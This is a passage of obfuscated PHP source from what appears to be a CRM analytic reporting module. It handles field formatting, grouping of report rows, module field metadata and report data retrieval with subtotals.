=>array());$ZZS1818 = $value;switch ($field['uitype']){case 'date': case 'datetime': case 'datetimecombo': if(!isset($field["dateGrouping"]) || in_array($field["dateGrouping"],array("day","month","monthAndYear"))){if(count(explode("-",$value))==2){$ZZZz25 = explode(" ",$value,2);$ZZZZZZZZZZZZk10 = explode("-",$ZZZz25[0],3);if(!preg_match("/^[0-9]{1,2}$/",$ZZZZZZZZZZZZk10[1])){return $ZZS1818;} $ZZZZZZZZZZZZk10[1] = $this->ZZZZS1818->ZZZZZE44(intval($ZZZZZZZZZZZZk10[1],10));$ZZZz25[0] = implode("-",$ZZZZZZZZZZZZk10);$ZZS1818 = implode(" ",$ZZZz25);}else{if(!empty($value)){$ZZS1818 = $this->ZZZZZZZZZZZZZZZY2424($value);}}} break;case 'enum': case 'multienum': case 'dynamicenum': $ZZZZZZZZZZZZZZZZb1 = $field["module"].$field["tablename"].$field["columnname"];if(!isset($ZZZp15[$ZZZZZZZZZZZZZZZZb1])){$ZZZZZZZZZZZZZZZZc2 = $ZZZZZZZZZZj9[$field["module"]]->name;$ZZZp15[$ZZZZZZZZZZZZZZZZb1] = $this->ZZZZS1818->ZZZZZm12($field["fieldname_org"],$ZZZZZZZZZZZZZZZZc2,$this->db);} if(isset($ZZZp15[$ZZZZZZZZZZZZZZZZb1][$value])){$ZZS1818 = $ZZZp15[$ZZZZZZZZZZZZZZZZb1][$value];} break;case '33': $ZZZZZZZZZZZZZZZZb1 = $field["module"].$field["tablename"].$field["columnname"];if(!isset($ZZZp15[$ZZZZZZZZZZZZZZZZb1])){$ZZZZZZZZZZZZZZZZc2 = $ZZZZZZZZZZj9[$field["module"]]->name;$ZZZp15[$ZZZZZZZZZZZZZZZZb1] = $this->ZZZZS1818->ZZZZZm12($field["fieldname_org"],$ZZZZZZZZZZZZZZZZc2,$this->db);} $ZZZZZZZZZZZZZZZZd3 = explode(" |##| ", $value);$ZZZZZZZZZZZZZZZZe4 = array();foreach($ZZZZZZZZZZZZZZZZd3 as $ZZZZZZZZZZZZZZZZf5){if(!empty($ZZZZZZZZZZZZZZZZf5)){$ZZZZZZZZZZZZZZZZg6 = $ZZZZZZZZZZZZZZZZf5;if(isset($ZZZp15[$ZZZZZZZZZZZZZZZZb1][$ZZZZZZZZZZZZZZZZf5])){$ZZZZZZZZZZZZZZZZg6 = $ZZZp15[$ZZZZZZZZZZZZZZZZb1][$ZZZZZZZZZZZZZZZZf5];} $ZZZZZZZZZZZZZZZZe4[] = $ZZZZZZZZZZZZZZZZg6;}} if(!empty($ZZZZZZZZZZZZZZZZe4)){$ZZS1818 = implode(", ",$ZZZZZZZZZZZZZZZZe4);} break;case '117': if(!isset($ZZZp15['its_currencies'][$value])){$ZZZZZZZZZZZZZZZZh7 = $this->db->ZZQ1616($value);$ZZZp15['its_currencies'][$value] = ($ZZZZZZZZZZZZZZZZh7)?($ZZZZZZZZZZZZZZZZh7):($value);} if(isset($ZZZp15['its_currencies'][$value])){$ZZS1818 = $ZZZp15['its_currencies'][$value];} break;case '-24': $ZZZZZZZZZZZZZZZZb1 = $field["module"].$field["tablename"].$field["columnname"];if(!isset($ZZZp15[$ZZZZZZZZZZZZZZZZb1])){$ZZZZZZZZZZZZZZZZc2 = $ZZZZZZZZZZj9[$field["module"]]->name;$ZZZp15[$ZZZZZZZZZZZZZZZZb1] = $this->ZZZZS1818->ZZZZZo14($field["fieldname_org"],$ZZZZZZZZZZZZZZZZc2,$this->db);} if(isset($ZZZp15[$ZZZZZZZZZZZZZZZZb1][$value])){$ZZS1818 = $ZZZp15[$ZZZZZZZZZZZZZZZZb1][$value];} break;default: break;} return $ZZS1818;} function ZZZZZZZZZZZZZI88(&$ZZZZZZZZZZZZZZX2323){$ZZT1919 = count($ZZZZZZZZZZZZZZX2323);for($Zf5 = 0;$Zf5< $ZZT1919;$Zf5++){$this->ZZZZZZZZZZZZZZZZi8($ZZZZZZZZZZZZZZX2323[$Zf5]);}} function ZZZZZZZZZZZZZZZZi8(&$ZZr17){for($Zf5 = 0;$Zf5<$this->ZZT1919;$Zf5++){foreach($ZZr17 as $Zu20 => $value) {$ZZr17[$Zu20] = html_entity_decode($value, ENT_QUOTES, "UTF-8");} if(isset($ZZr17[$this->ZZZZZZZZZZZZZZZQ1616[$Zf5]["fieldname"]])){$ZZr17[$this->ZZZZZZZZZZZZZZZQ1616[$Zf5]["fieldname"]] = $this->ZZZZZZZZZZZZZZZZa0($ZZr17[$this->ZZZZZZZZZZZZZZZQ1616[$Zf5]["fieldname"]],$this->ZZZZZZZZZZZZZZZQ1616[$Zf5],$this->ZZZZZZZZZZZZZF55);}} if($this->ZZZZZZZZZZZZZC22){$ZZZZZZZZZZZZZZs18 = count($this->ZZZc2);for($Zf5 = 0;$Zf5<$ZZZZZZZZZZZZZZs18;$Zf5++){if(isset($ZZr17[$this->ZZZc2[$Zf5]["fieldname"]]) && $ZZr17[$this->ZZZc2[$Zf5]["fieldname"]] === null){$ZZr17[$this->ZZZc2[$Zf5]["fieldname"]] = 0;}}}}} class ZZZZZZZZZZZZZH77{protected $ZZZZZZZZZZZZZZZZj9 = array();protected $ZZZc2;protected $ZZZZZZZZZZZZZZZZk10 = 0;protected $ZZZG66;protected $ZZZZZZZZZZZZW2222 = false;protected $ZZZZZZZZZZZZZZZZl11 = array();protected $ZZZZZZZZZZZZZZZZm12 = array();function ZZZZZZZZZZZZZZZZn13(){$ZZS1818 = array();$ZZZZZZZZZZZZZZY2424 = array();$ZZT1919 = count($this->ZZZc2);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$this->ZZZZZZZZZZZZZZZZl11[$this->ZZZc2[$Zf5]["fieldname"]] = $this->ZZZc2[$Zf5]["uitype"];$ZZZZZZZZZZZZZZY2424[] = $this->ZZZc2[$Zf5]["fieldname"];} $ZZT1919 = count($this->ZZZG66);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){if(in_array($this->ZZZG66[$Zf5]["name"],$ZZZZZZZZZZZZZZY2424) && $this->ZZZZZZZZZZZZZZZZl11[$this->ZZZG66[$Zf5]["name"]] == 33 && !empty($this->ZZZG66[$Zf5]["transform"])){$ZZS1818[] = $this->ZZZG66[$Zf5];} if(in_array($this->ZZZG66[$Zf5]["name"],$ZZZZZZZZZZZZZZY2424)){$this->ZZZZZZZZZZZZZZZZm12[] = $this->ZZZG66[$Zf5]["name"];}} return $ZZS1818;} function __construct($ZZZG66,$ZZZc2,$ZZZZZZZZZZZZW2222){$this->ZZZG66= $ZZZG66;$this->ZZZc2 = $ZZZc2;$this->ZZZZZZZZZZZZW2222 = $ZZZZZZZZZZZZW2222;$this->ZZZZZZZZZZZZZZZZj9 = $this->ZZZZZZZZZZZZZZZZn13();} function ZZZZZZZZZZZZZZZZo14($ZZZZn13,$r17){$ZZZZZZZZZZZZZZZG66 = array();for($Zf5 = 0;$Zf5<$this->ZZZZZZZZZZZZZZZZk10;$Zf5++){if(!in_array($r17[$Zf5][$ZZZZn13],$ZZZZZZZZZZZZZZZG66)){$ZZZZZZZZZZZZZZZG66[] = $r17[$Zf5][$ZZZZn13];}} $ZZS1818 = array();$ZZT1919 = count($ZZZZZZZZZZZZZZZG66);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$ZZS1818[$ZZZZZZZZZZZZZZZG66[$Zf5]] = explode(' |##| ',$ZZZZZZZZZZZZZZZG66[$Zf5]);if(count($ZZS1818[$ZZZZZZZZZZZZZZZG66[$Zf5]]) == 1){unset($ZZS1818[$ZZZZZZZZZZZZZZZG66[$Zf5]]);}} return $ZZS1818;} function ZZZZZZZZZZZZZZZZp15($ZZZZO1414,$r17){} function ZZZZZZZZZZZZZZZZq16($ZM1212,$ZZZZZZZZZZZZZZZZr17){$ZZZZZZZZZZZZZZZZs18 = true;$ZZT1919 = count($this->ZZZZZZZZZZZZZZZZm12);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){if($ZM1212[$this->ZZZZZZZZZZZZZZZZm12[$Zf5]] !== $ZZZZZZZZZZZZZZZZr17[$this->ZZZZZZZZZZZZZZZZm12[$Zf5]]){$ZZZZZZZZZZZZZZZZs18 = false;}} return $ZZZZZZZZZZZZZZZZs18;} function ZZZZZZZZZZZZZZZZt19(&$r17,$ZZZZZZu20,$ZZZZZZZZZZZZZZZZu20,$field,&$ZZZZZZZZZZZZZZZZv21,&$ZZZZZZZZZZZZZZZZw22){$ZZZZZZZZZZZZZZE44 = array_merge(array_keys($r17[$ZZZZZZZZZZZZZZZZu20]),array_keys($r17[$ZZZZZZu20]));$ZZZZZZZZZZZZZZE44 = array_unique($ZZZZZZZZZZZZZZE44);$ZZT1919 = count($ZZZZZZZZZZZZZZE44);$ZZZZZZZZZZZv21 = PlatformConnector::ZZZZZZz25();for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){if(is_numeric($r17[$ZZZZZZu20][$ZZZZZZZZZZZZZZE44[$Zf5]]) && !in_array($ZZZZZZZZZZZZZZE44[$Zf5],$this->ZZZZZZZZZZZZZZZZm12)){$r17[$ZZZZZZZZZZZZZZZZu20][$ZZZZZZZZZZZZZZE44[$Zf5]] = (string)round((floatval($r17[$ZZZZZZZZZZZZZZZZu20][$ZZZZZZZZZZZZZZE44[$Zf5]]) + floatval($r17[$ZZZZZZu20][$ZZZZZZZZZZZZZZE44[$Zf5]])),$ZZZZZZZZZZZv21);}} array_splice($r17,$ZZZZZZu20,1);$this->ZZZZZZZZZZZZZZZZk10--;if($ZZZZZZZZZZZZZZZZu20>$ZZZZZZu20){$ZZZZZZZZZZZZZZZZu20--;} $ZZT1919 = count($ZZZZZZZZZZZZZZZZv21);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){if($ZZZZZZZZZZZZZZZZv21[$Zf5]>$ZZZZZZu20){$ZZZZZZZZZZZZZZZZv21[$Zf5]--;}} $ZZZZZZZZZZZZZZZZx23 = array_search($ZZZZZZu20,$ZZZZZZZZZZZZZZZZw22[$r17[$ZZZZZZZZZZZZZZZZu20][$field]]);array_splice($ZZZZZZZZZZZZZZZZw22[$r17[$ZZZZZZZZZZZZZZZZu20][$field]],$ZZZZZZZZZZZZZZZZx23,1);foreach ($ZZZZZZZZZZZZZZZZw22 as &$ZZZZZn13) {$ZZT1919 = count($ZZZZZn13);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){if($ZZZZZn13[$Zf5]>$ZZZZZZu20){$ZZZZZn13[$Zf5]--;}}}} function ZZZZZZZZZZZZZZZZy24($ZZZZZZZZZZZZZZZZz25,$field,&$r17){$ZZZZZZZZZZZZZZZZA00 = array();$ZZZZZZZZZZZZZZZZB11 = array();foreach($ZZZZZZZZZZZZZZZZz25 as $ZZZZZn13){$ZZT1919 = count($ZZZZZn13);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){if(!isset($ZZZZZZZZZZZZZZZZA00[$ZZZZZn13[$Zf5]])){$ZZZZZZZZZZZZZZZZA00[$ZZZZZn13[$Zf5]] = array();}}} for($Zf5 = 0;$Zf5<$this->ZZZZZZZZZZZZZZZZk10;$Zf5++){if(isset($ZZZZZZZZZZZZZZZZz25[$r17[$Zf5][$field]])){$ZZZz25 = $r17[$Zf5];$ZZZZZZZZZZZZZZZZC22 = array();$ZZT1919 = count($ZZZZZZZZZZZZZZZZz25[$r17[$Zf5][$field]]);for($ZZZZZK1010 = 0;$ZZZZZK1010 < $ZZT1919;$ZZZZZK1010++){$ZZZZZZZZZZZZZZZZC22[$ZZZZZK1010] = $ZZZz25;$ZZZZZZZZZZZZZZZZC22[$ZZZZZK1010][$field] = $ZZZZZZZZZZZZZZZZz25[$r17[$Zf5][$field]][$ZZZZZK1010];$ZZZZZZZZZZZZZZZZB11[] = $Zf5+$ZZZZZK1010;$ZZZZZZZZZZZZZZZZA00[$ZZZZZZZZZZZZZZZZz25[$r17[$Zf5][$field]][$ZZZZZK1010]][] = $Zf5+$ZZZZZK1010;} $this->ZZZZZZZZZZZZZZZZk10 = $this->ZZZZZZZZZZZZZZZZk10 + $ZZT1919 -1;array_splice($r17,$Zf5,1,$ZZZZZZZZZZZZZZZZC22);$Zf5 = $Zf5 + $ZZT1919 -1;}elseif(isset($ZZZZZZZZZZZZZZZZA00[$r17[$Zf5][$field]])){$ZZZZZZZZZZZZZZZZA00[$r17[$Zf5][$field]][] = $Zf5;}} if ($this->ZZZZZZZZZZZZW2222) {$ZZT1919 = count($ZZZZZZZZZZZZZZZZB11);for ($Zf5 = 0;$Zf5 < $ZZT1919;$Zf5++) {$ZZZZZZZZZZZZZZs18 = count($ZZZZZZZZZZZZZZZZA00[$r17[$ZZZZZZZZZZZZZZZZB11[$Zf5]][$field]]);for ($ZZZZZK1010 = 0;$ZZZZZK1010 < $ZZZZZZZZZZZZZZs18;$ZZZZZK1010++) {if ($ZZZZZZZZZZZZZZZZB11[$Zf5] != $ZZZZZZZZZZZZZZZZA00[$r17[$ZZZZZZZZZZZZZZZZB11[$Zf5]][$field]][$ZZZZZK1010]) {if ($this->ZZZZZZZZZZZZZZZZq16($r17[$ZZZZZZZZZZZZZZZZB11[$Zf5]], $r17[$ZZZZZZZZZZZZZZZZA00[$r17[$ZZZZZZZZZZZZZZZZB11[$Zf5]][$field]][$ZZZZZK1010]])) {$this->ZZZZZZZZZZZZZZZZt19($r17, $ZZZZZZZZZZZZZZZZB11[$Zf5], $ZZZZZZZZZZZZZZZZA00[$r17[$ZZZZZZZZZZZZZZZZB11[$Zf5]][$field]][$ZZZZZK1010], $field, $ZZZZZZZZZZZZZZZZB11, $ZZZZZZZZZZZZZZZZA00);break;}}}}}} function ZZZZZZZZZZZZZI88(&$r17){$this->ZZZZZZZZZZZZZZZZk10 = count($r17);$ZZT1919 = count($this->ZZZZZZZZZZZZZZZZj9);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$ZZZZZZZZZZZZZZZZz25 = $this->ZZZZZZZZZZZZZZZZo14($this->ZZZZZZZZZZZZZZZZj9[$Zf5]["name"],$r17);$this->ZZZZZZZZZZZZZZZZy24($ZZZZZZZZZZZZZZZZz25,$this->ZZZZZZZZZZZZZZZZj9[$Zf5]["name"],$r17);}}}
class ZZZZZZZZZZZZZP1515{protected $id = 0;function ZZZZZZZZZZZZZI88(&$ZZZZZZZZZZZZZZX2323){$ZZT1919 = count($ZZZZZZZZZZZZZZX2323);for($Zf5 = 0;$Zf5< $ZZT1919;$Zf5++){$this->ZZZZZZZZZZZZZZZZi8($ZZZZZZZZZZZZZZX2323[$Zf5]);}} function ZZZZZZZZZZZZZZZZi8(&$ZZr17){$this->id++;$ZZr17["id"] = $this->id;}} class ZZZZZZZZZZx23 {public $name;protected $db;protected $ZZZZS1818;public $prefix = "";public $fieldTitlePrefix = "";public $relationDescr = null;function __construct($name, ZZp15 $db, ZZZZT1919 $ZZZZS1818){$this->name = $name;$this->db = $db;$this->ZZZZS1818 = $ZZZZS1818;$this->prefix = "0_".$this->name."_";} function ZZZZZZZZZZZZZZZZD33($field){$ZZZZZn13 = $this->ZZZZS1818->ZZZZZm12($field['fieldname'],$this->name,$this->db);$ZZS1818 = array();foreach($ZZZZZn13 as $ZZZT1919 => $ZZZZZZZZZZZZZZZe4){$ZZS1818[] = array("val" => $ZZZT1919,"title" => $ZZZZZZZZZZZZZZZe4);} return $ZZS1818;} function ZZZZZZZZZZZZZZZZE44($field){$ZZZZZZZZZZZZZZZh7 = array();switch ($field['uitype']) {case 'name': case 'text': case 'varchar': $type = "txt";break;case 'enum': case 'multienum': case 'dynamicenum': $type = "select";$ZZZZZZZZZZZZZZZh7 = $this->ZZZZZZZZZZZZZZZZD33($field);break;case 'id': $type = "txt";break;case 'int': $type = "integer";break;case 'currency': case 'float': case 'decimal': $type = "number";break;case 'datetimecombo': case 'datetime': $type = "datetime";break;case 'date': $type = "date";break;case 'bool': $type = "checkbox";break;case 'relate': if(in_array($field["fieldname"], array("assigned_user_id"))) {$type = "user";} else {$type = "txt";} break;case 'assigned_user_name': $type = "user";break;default: $type = "txt";break;} $ZZZZZZZZZZZZZZZZF55 = explode("~", $field['typeofdata']);if($ZZZZZZZZZZZZZZZZF55[0]=="D"){$type = "date";} if($ZZZZZZZZZZZZZZZZF55[0]=="N"||$ZZZZZZZZZZZZZZZZF55[0]=="I"){if(!$this->ZZZZS1818->ZZZZZy24($field)){$type = "number";}} return array("name"=>$this->prefix.$field['fieldname'], "column"=>$field['columnname'], "table"=>$field['tablename'], "uitype"=>$field['uitype'], "type"=>$type, "title"=>$this->fieldTitlePrefix.$this->ZZZZS1818->ZZZZZk10($field['fieldlabel'],$this->name), "availableValues" =>$ZZZZZZZZZZZZZZZh7, "bareTitle"=>$this->ZZZZS1818->ZZZZZk10($field['fieldlabel'],$this->name),);} function ZZZZZZZZZZZF55(){return $this->ZZZZS1818->ZZZZZp15($this->name);} function ZZZZZZZZZZZZI88(){$ZZZz25 = $this->ZZZZS1818->ZZZZZs18($this->name);$ZZT1919 = count($ZZZz25);$ZZS1818 = array();for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$ZZS1818[$ZZZz25[$Zf5]['name']] = $ZZZz25[$Zf5];} return $ZZS1818;} function ZZZZZZZZZZZZZU2020(){$ZZZc2 = $this->db->ZZW2222($this->name);$ZZS1818 = array();$ZZT1919 = count($ZZZc2);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$ZZS1818[] = $this->ZZZZZZZZZZZZZZZZE44($ZZZc2[$Zf5]);} return $ZZS1818;} function ZZZZZZZZZZZZZZZZG66($ZZZZo14,$ZZZZZZZZZZZZZZZZH77 = false){if($ZZZZo14['label'] == "---"){$ZZS1818 = array("title" => $this->ZZZZS1818->ZZZZZk10($this->name,$this->name), "fields" => array(),);}else{$ZZS1818 = array("title" => $this->ZZZZS1818->ZZZZZk10($ZZZZo14['label'],$this->name), "fields" => array(),);} if($ZZZZo14['id'] === 52){$ZZS1818["title"] = $this->ZZZZS1818->ZZZZZk10($ZZZZo14['label'],"Invoice");} $ZZT1919 = count($ZZZZo14['fields']);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){if(!$ZZZZZZZZZZZZZZZZH77 || !($ZZZZo14['fields'][$Zf5]['tablename']== "vtiger_crmentity" && $ZZZZo14['fields'][$Zf5]['columnname']=='assigned_user_id')){$ZZS1818['fields'][] = $this->ZZZZZZZZZZZZZZZZE44($ZZZZo14['fields'][$Zf5]);}} return $ZZS1818;} function ZZZZZZZZZV2121(){$ZZZc2 = $this->db->ZZW2222($this->name);$ZZS1818 = array();$ZZT1919 = count($ZZZc2);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$ZZZc2[$Zf5]["module"] = 0;$ZZZc2[$Zf5]['fieldname_org'] = $ZZZc2[$Zf5]['fieldname'];$ZZZc2[$Zf5]['fieldname'] = "0_".$this->name."_".$ZZZc2[$Zf5]['fieldname'];$ZZZc2[$Zf5]['fieldlabel'] = $this->ZZZZS1818->ZZZZZk10($ZZZc2[$Zf5]['fieldlabel'],$this->name);$ZZS1818[$ZZZc2[$Zf5]['fieldname']] = $ZZZc2[$Zf5];} return $ZZS1818;} function ZZZZZZZZZZC22($ZZZZZZZZZZZZZZZZH77 = false){$ZZZZZZZZZZZZZZZZI88 = $this->db->ZZZr17($this->name);$ZZS1818 = array();$ZZT1919 = count($ZZZZZZZZZZZZZZZZI88);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$ZZS1818[] = $this->ZZZZZZZZZZZZZZZZG66($ZZZZZZZZZZZZZZZZI88[$Zf5],$ZZZZZZZZZZZZZZZZH77);} return $ZZS1818;}} class ZZZZZZZZZZy24 extends ZZZZZZZZZZx23{public $relationDescr;public $prefix = "";public $ZZZZZZZZZZZZZZZZJ99 = "";function __construct($name, ZZp15 $db, ZZZZT1919 $ZZZZS1818,$relationDescr){parent::__construct($name,$db,$ZZZZS1818);$this->relationDescr = $relationDescr;} function ZZZZZZZZZZZZZZZZG66($ZZZZo14,$ZZZZZZZZZZZZZZZZH77 = false){$ZZS1818 = parent::ZZZZZZZZZZZZZZZZG66($ZZZZo14,$ZZZZZZZZZZZZZZZZH77);$ZZS1818["title"] = $this->ZZZZZZZZZZZZZZZZJ99.$ZZS1818["title"];return $ZZS1818;} function ZZZZZZZZZV2121($ZZZZZZZZZZZc2 = 0){$ZZZc2 = $this->db->ZZW2222($this->name);$ZZS1818 = array();$ZZT1919 = count($ZZZc2);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$ZZZc2[$Zf5]['fieldname_org'] = $ZZZc2[$Zf5]['fieldname'];$ZZZc2[$Zf5]['fieldname'] = $ZZZZZZZZZZZc2."_".$this->name."_".$ZZZc2[$Zf5]['fieldname'];$ZZZc2[$Zf5]['fieldlabel'] = $this->ZZZZS1818->ZZZZZk10($ZZZc2[$Zf5]['fieldlabel'],$this->name);$ZZZc2[$Zf5]['module'] = $ZZZZZZZZZZZc2;$ZZS1818[$ZZZc2[$Zf5]['fieldname']] = $ZZZc2[$Zf5];} return $ZZS1818;}}
;require_once "modules/AnalyticReporting/lib/PHPEXCEL/Classes/PHPExcel.php";require_once 'modules/AnalyticReporting/lib/PHPEXCEL/Classes/PHPExcel.php';function retrieveData($adb,$ZZZZZZZZZZZZZZZZZZm12 = false,$ZZZZZZZZZZZZZZZZZZn13 = null){$ZZZZS1818 = new ZZZZT1919();if(!$ZZZZZZZZZZZZZZZZZZm12){$db = new ZZp15($adb);$ZZZZZZZZZZZZZZZZZZn13 = $db->loadReport((int)$_REQUEST["record"]);}else{$db = $adb;$ZZZZZZZZZZZZZZZZZZn13["related_data"] = json_decode($ZZZZZZZZZZZZZZZZZZn13["related_data"]);} $ZZZZZZZZZZZZZD33 = PlatformConnector::ZZZZZZe4();$ZZZK1010 = ($ZZZZZZZZZZZZZZZZZZm12)?json_decode($ZZZZZZZZZZZZZZZZZZn13["labels"],true):json_decode($_POST['labels'],true);if(isset($_REQUEST["combined"]) &&$_REQUEST["combined"] == 1){$module = null;$ZZZZZZZZZZZZZZZZZZo14 = new ZZZZZZZZZZZZZZ2525($db, $ZZZZS1818, $ZZZK1010);}else{$module = new ZZZZZZZZZZx23($ZZZZZZZZZZZZZZZZZZn13["module"],$db,$ZZZZS1818);$ZZZZZZZZZZZZZZZZZZo14 = new ZZZZZZZZZZZZZv21($db, $ZZZZS1818, $ZZZK1010);} $ZZZZZZZZZZZZZZZZZZp15 = array();$ZZT1919 = count($ZZZZZZZZZZZZZZZZZZn13["related_data"]);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$ZZZZZZZZZZZZZZZZZZp15[] = new ZZZZZZZZZZu20($ZZZZZZZZZZZZZZZZZZn13["related_data"][$Zf5][0], $ZZZZZZZZZZZZZZZZZZn13["related_data"][$Zf5][1], $ZZZZZZZZZZZZZZZZZZn13["related_data"][$Zf5][2], $ZZZZZZZZZZZZZZZZZZn13["related_data"][$Zf5][3], $ZZZZZZZZZZZZZZZZZZn13["related_data"][$Zf5][4], $ZZZZZZZZZZZZZZZZZZn13["related_data"][$Zf5][5], $ZZZZZZZZZZZZZZZZZZn13["related_data"][$Zf5][6], $ZZZZZZZZZZZZZZZZZZn13["related_data"][$Zf5][7], $ZZZZZZZZZZZZZZZZZZn13["related_data"][$Zf5][8], $ZZZZZZZZZZZZZZZZZZn13["related_data"][$Zf5][9]);} $ZZZJ99 = ($ZZZZZZZZZZZZZZZZZZm12)?json_decode($ZZZZZZZZZZZZZZZZZZn13["options"]):json_decode($_POST["options"]);if(!isset($ZZZJ99->aggregateColumn)){$ZZZJ99->aggregateColumn = false;} global $current_user;$id = (int)$_REQUEST["record"];$ZZZZZZZZZZZZZZZZZZq16 = new ZZZZZZZZZZZZZZZZZc2($db,$ZZZZS1818);$ZZZZZZZZZZZZZZZZZZr17 = $ZZZZZZZZZZZZZZZZZZq16->ZZZZZZZZZZZZZZZZZp15($current_user,$id);if($ZZZZZZZZZZZZZZZZZZr17 == 1){$_POST['columns'] = $ZZZZZZZZZZZZZZZZZZn13["fields"];$_POST['filters'] = $ZZZZZZZZZZZZZZZZZZn13["filters"];$_POST['labels'] = $ZZZZZZZZZZZZZZZZZZn13["labels"];} $r17 = $ZZZZZZZZZZZZZZZZZZo14->ZZZZZZZZZZZZZA00($module, ($ZZZZZZZZZZZZZZZZZZm12)?json_decode($ZZZZZZZZZZZZZZZZZZn13["fields"]):json_decode($_POST['columns']), ($ZZZZZZZZZZZZZZZZZZm12)?json_decode($ZZZZZZZZZZZZZZZZZZn13["filters"]):json_decode($_POST['filters']), $ZZZZZZZZZZZZZZZZZZp15, ($ZZZZZZZZZZZZZZZZZZm12)?json_decode($ZZZZZZZZZZZZZZZZZZn13["grouping"],true):json_decode($_POST['grouping'],true), ($ZZZZZZZZZZZZZZZZZZm12)?json_decode($ZZZZZZZZZZZZZZZZZZn13["aggregates"],true):json_decode($_POST['aggregates'],true), !$ZZZJ99->includeDetails, $ZZZJ99->isCrosstab, false, $ZZZJ99->aggregateColumn, "yyyy-mm-dd", false, ($ZZZZZZZZZZZZZZZZZZm12) ? json_decode($ZZZZZZZZZZZZZZZZZZn13["calcFields"],true) : json_decode($_POST['calcFields'], true), array(), $ZZZZZZZZZZZZZD33);if((isset($_REQUEST['file']) && $_REQUEST['file'] == 'makePDF') || count($_REQUEST) == 0){$ZZZZZZZZZZZZZZZZZZs18 = $ZR1717 = $ZZZZZZZZZZZZZZZZZZt19 = $ZZZH77 = $ZZZZZZZZZZZZZZZZZZu20 = $ZZZZZZZZZZZZZZZZZZv21 = array();$ZZZZZZZZZZZZZZZZZZs18 = ($ZZZZZZZZZZZZZZZZZZm12)?json_decode($ZZZZZZZZZZZZZZZZZZn13["grouping"],true):json_decode($_POST['grouping'],true);$ZZZZZZZZZZZZZZZZZZw22 = 0;if(!$ZZZJ99->includeDetails && !$ZZZJ99->aggregateColumn){foreach ($ZZZZZZZZZZZZZZZZZZs18 as $ZZZZn13) {if(!$ZZZJ99->isCrosstab || $ZZZZn13['position'] == 'row'){if($ZZZZn13['dateGrouping'] != "") $ZZZZZZZZZZZZZZZZZZx23 = $ZZZZn13['name']."_".$ZZZZn13['dateGrouping'];else $ZZZZZZZZZZZZZZZZZZx23 = $ZZZZn13['name'];$ZZZZZZZZZZZZZZZJ99[] = $ZZZZZZZZZZZZZZZZZZx23;if(isset($ZZZZn13['showAggregates'])){foreach($ZZZZn13['showAggregates'] as $ZZZZZZZZZZZZZZZZZZy24 => $ZZZZZZZZZZZZP1515){if(isset($ZZZZZZZZZZZZP1515['sum']) && $ZZZZZZZZZZZZP1515['sum']) $ZZZH77[] = $ZZZZZZZZZZZZZZZZZZy24."_sum";if(isset($ZZZZZZZZZZZZP1515['count']) && $ZZZZZZZZZZZZP1515['count']) $ZZZH77[] = $ZZZZZZZZZZZZZZZZZZy24."_cnt";}}}} array_pop($ZZZZZZZZZZZZZZZJ99);$ZZZH77 = array_unique($ZZZH77);if(count($ZZZZZZZZZZZZZZZJ99)>0){foreach ($r17['data'] as $ZZZZZZZZZZZZZZZZZZz25 => $ZZZZZZZZZZZZZZZZZZA00) {foreach ($ZZZZZZZZZZZZZZZJ99 as $ZZZZZZZZZZZZZZZZZZB11) {if(isset($ZR1717[$ZZZZZZZZZZZZZZZZZZB11][$ZZZZZZZZZZZZZZZZZZB11]) && $ZR1717[$ZZZZZZZZZZZZZZZZZZB11][$ZZZZZZZZZZZZZZZZZZB11] != $ZZZZZZZZZZZZZZZZZZA00[$ZZZZZZZZZZZZZZZZZZB11]){$ZZZZZK1010 = count($ZZZZZZZZZZZZZZZJ99)-1;do{$ZZZZZZZZZZZZZZZZZZC22 = $ZZZZZZZZZZZZZZZJ99[$ZZZZZK1010];foreach ($ZR1717[$ZZZZZZZZZZZZZZZZZZC22] as $Zu20 => $value) {$ZZZZZZZZZZZZZZZZZZj9[$Zu20] = "<SubTotal>".$value;if(in_array($Zu20, $ZZZZZZZZZZZZZZZJ99) && $Zu20 != $ZZZZZZZZZZZZZZZZZZC22) unset($ZZZZZZZZZZZZZZZZZZj9[$Zu20]);} if(!isset($ZZZZZZZZZZZZZZZZZZt19[$ZZZZZZZZZZZZZZZZZZC22]))$ZZZZZZZZZZZZZZZZZZt19[$ZZZZZZZZZZZZZZZZZZC22] = 0;array_splice($r17['data'], (int)$ZZZZZZZZZZZZZZZZZZt19[$ZZZZZZZZZZZZZZZZZZC22], 0, array($ZZZZZZZZZZZZZZZZZZj9));$ZZZZZZZZZZZZZZZZZZw22++;$ZZZZZZZZZZZZZZZZZZt19[$ZZZZZZZZZZZZZZZZZZC22] = $ZZZZZZZZZZZZZZZZZZz25+$ZZZZZZZZZZZZZZZZZZw22;$ZZZZZK1010--;unset($ZZZZZZZZZZZZZZZZZZj9);}while($ZZZZZZZZZZZZZZZZZZC22 != $ZZZZZZZZZZZZZZZZZZB11);if($ZZZZZZZZZZZZZZZZZZB11 == $ZZZZZZZZZZZZZZZJ99[0]) {foreach ($ZZZZZZZZZZZZZZZZZZt19 as &$ZZZZZZZZZZZZZZZZZZD33) $ZZZZZZZZZZZZZZZZZZD33 = $ZZZZZZZZZZZZZZZZZZz25+$ZZZZZZZZZZZZZZZZZZw22;unset($ZR1717);} if(isset($ZR1717[$ZZZZZZZZZZZZZZZZZZB11]))unset($ZR1717[$ZZZZZZZZZZZZZZZZZZB11]);break;}} foreach ($ZZZZZZZZZZZZZZZZZZA00 as $ZZZZZZZZZZZZZZZZZZE44 => $ZZZZZZZZZZZZZZZZZZF55) {$ZZZZZZZZZZZZZZZZZZG66 = preg_replace('/[v]\d+[_]/', '', $ZZZZZZZZZZZZZZZZZZE44);foreach ($ZZZZZZZZZZZZZZZJ99 as 